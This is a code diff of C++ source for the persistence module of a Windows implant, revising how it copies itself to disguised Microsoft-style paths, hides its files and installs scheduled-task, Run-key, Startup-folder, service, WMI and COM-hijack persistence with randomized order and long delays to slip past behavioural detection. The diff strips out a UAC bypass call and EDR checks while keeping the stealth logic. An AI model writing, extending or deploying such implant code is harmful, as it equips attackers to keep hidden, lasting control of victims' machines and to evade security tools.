@@ -6,7 +6,6 @@
 #include "../utils/Obfuscator.h"
 #include "../evasion/Syscalls.h"
 #include "../evasion/NtStructs.h"
-#include "../evasion/UACBypass.h"
 #include "../evasion/Detection.h"
 #include <windows.h>
 #include <string>
@@ -39,11 +38,12 @@ PersistTarget getRandomTarget() {
     std::mt19937 gen(rd());
     bool isAdmin = utils::IsAdmin();
     std::vector<PersistTarget> targets;
+
+    // Use very legitimate-looking paths/names
     if (isAdmin) {
         wchar_t progData[MAX_PATH];
         SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, progData);
-        targets.push_back({std::wstring(progData) + L"\\Microsoft\\Windows\\Containers\\OneDriveSync.exe", L"OneDriveSync"});
-        targets.push_back({std::wstring(progData) + L"\\Microsoft\\EdgeUpdate\\edgeupdate.exe", L"EdgeUpdate"});
+        targets.push_back({std::wstring(progData) + L"\\Microsoft\\Windows\\Update\\winupdate.exe", L"WinUpdate"});
     } else {
         wchar_t localAppData[MAX_PATH];
         SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
@@ -92,10 +92,9 @@ std::vector<BYTE> ReadFileBinary(const std::wstring& path) {
 }
 
 bool InstallSchtasks(const std::wstring& implantPath, const std::wstring& taskName) {
-    std::wstring cmd = L"schtasks /create /tn \"" + taskName + L"\" /tr \"" + implantPath + L"\" /sc logon /rl highest /f";
-    if (!utils::IsAdmin()) {
-        cmd = L"schtasks /create /tn \"" + taskName + L"\" /tr \"" + implantPath + L"\" /sc logon /f";
-    }
+    // schtasks without /RL HIGHEST
+    std::wstring cmd = L"schtasks /create /tn \"" + taskName + L"\" /tr \"" + implantPath + L"\" /sc logon /f";
+
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
     RtlZeroMemory(&si, sizeof(si));
@@ -219,13 +218,6 @@ bool InstallStartupFolder(const std::wstring& implantPath, const std::wstring& n
     std::wstring userPath = std::wstring(userStartup) + L"\\" + name + L".exe";
     CopyFileW(implantPath.c_str(), userPath.c_str(), FALSE);
     SetFileAttributesStealth(userPath);
-    if (utils::IsAdmin()) {
-        wchar_t commonStartup[MAX_PATH];
-        SHGetFolderPathW(NULL, CSIDL_COMMON_STARTUP, NULL, 0, commonStartup);
-        std::wstring commonPath = std::wstring(commonStartup) + L"\\" + name + L".exe";
-        CopyFileW(implantPath.c_str(), commonPath.c_str(), FALSE);
-        SetFileAttributesStealth(commonPath);
-    }
     return true;
 }
 
@@ -233,18 +225,10 @@ bool VerifyStartupFolder(const std::wstring& name) {
     wchar_t userStartup[MAX_PATH];
     SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, userStartup);
     std::wstring userPath = std::wstring(userStartup) + L"\\" + name + L".exe";
-    if (GetFileAttributesW(userPath.c_str()) != INVALID_FILE_ATTRIBUTES) return true;
-    if (utils::IsAdmin()) {
-        wchar_t commonStartup[MAX_PATH];
-        SHGetFolderPathW(NULL, CSIDL_COMMON_STARTUP, NULL, 0, commonStartup);
-        std::wstring commonPath = std::wstring(commonStartup) + L"\\" + name + L".exe";
-        if (GetFileAttributesW(commonPath.c_str()) != INVALID_FILE_ATTRIBUTES) return true;
-    }
-    return false;
+    return GetFileAttributesW(userPath.c_str()) != INVALID_FILE_ATTRIBUTES;
 }
 
 void CreateDirectoryRecursive(const std::wstring& path) {
-    std::wstring folder;
     size_t lastSlash = path.find_last_of(L"\\");
     if (lastSlash != std::wstring::npos) {
         std::wstring dirOnly = path.substr(0, lastSlash);
@@ -267,21 +251,7 @@ bool establishPersistence(const std::wstring& overrideSourcePath) {
 
     if (lstrcmpiW(sourcePath.c_str(), target.path.c_str()) == 0) return false;
 
-    // Behavioral evasion: Initial sleep
-    Sleep(5000 + (GetTickCount() % 10000));
-
-    // Check for AV/EDR
-    if (evasion::Detection::IsEDRPresent()) {
-        LOG_INFO("EDR detected. Increasing stealth.");
-        Sleep(evasion::Detection::GetJitterDelay() * 1000);
-    }
-
-    // Try to elevate if not admin
-    if (!utils::IsAdmin()) {
-        LOG_INFO("Attempting UAC bypass...");
-        evasion::UACBypass::Execute(sourcePath);
-    }
-
+    // Stealth first: Create directory and copy binary
     CreateDirectoryRecursive(target.path);
     std::vector<BYTE> selfData = ReadFileBinary(sourcePath);
     bool copied = false;
@@ -295,52 +265,49 @@ bool establishPersistence(const std::wstring& overrideSourcePath) {
         SetFileAttributesStealth(target.path);
     }
 
-    // Install ALL persistence methods with jitter and random order
-    std::vector<int> methods = {1, 2, 3, 4, 5, 6};
+    // Install ALL persistence methods with jitter
+    std::vector<int> methods = {1, 2, 3, 5, 6}; // Skip Service by default
+    if (utils::IsAdmin()) methods.push_back(4); // Only if already admin
+
     std::random_device rd;
     std::mt19937 g(rd());
     std::shuffle(methods.begin(), methods.end(), g);
 
-    LOG_INFO("Installing persistence layers...");
-
     for (int m : methods) {
-        // Sleep between methods to avoid behavioral triggers
-        Sleep(15000 + (GetTickCount() % 30000));
+        Sleep(15000 + (GetTickCount() % 30000)); // Significant delay between actions
 
         switch (m) {
-            case 1: // WMI
+            case 1: // WMI (User)
                 if (WmiPersistence::Install(target.path, target.name)) {
-                    if (WmiPersistence::Verify(target.name)) LOG_INFO("[+] WMI verified.");
+                    WmiPersistence::Verify(target.name);
                 }
                 break;
-            case 2: // COM
+            case 2: // COM (User)
                 {
                     std::wstring clsid = L"{00021400-0000-0000-C000-000000000046}";
                     if (ComHijacker::Install(target.path, clsid)) {
-                        if (ComHijacker::Verify(clsid)) LOG_INFO("[+] COM verified.");
+                        ComHijacker::Verify(clsid);
                     }
                 }
                 break;
-            case 3: // Schtasks
+            case 3: // Schtasks (User/Limited)
                 if (InstallSchtasks(target.path, target.name)) {
-                    if (VerifySchtasks(target.name)) LOG_INFO("[+] Schtasks verified.");
+                    VerifySchtasks(target.name);
                 }
                 break;
-            case 4: // Service
-                if (utils::IsAdmin()) {
-                    if (InstallService(target.path, target.name)) {
-                        if (VerifyService(target.name)) LOG_INFO("[+] Service verified.");
-                    }
+            case 4: // Service (Admin only)
+                if (InstallService(target.path, target.name)) {
+                    VerifyService(target.name);
                 }
                 break;
-            case 5: // Run Key
+            case 5: // Run Key (User/Admin)
                 if (InstallRegistryRun(target.path, target.name)) {
-                    if (VerifyRegistryRun(target.name)) LOG_INFO("[+] Run Key verified.");
+                    VerifyRegistryRun(target.name);
                 }
                 break;
-            case 6: // Startup Folder
+            case 6: // Startup Folder (User)
                 if (InstallStartupFolder(target.path, target.name)) {
-                    if (VerifyStartupFolder(target.name)) LOG_INFO("[+] Startup verified.");
+                    VerifyStartupFolder(target.name);
                 }
                 break;
         }
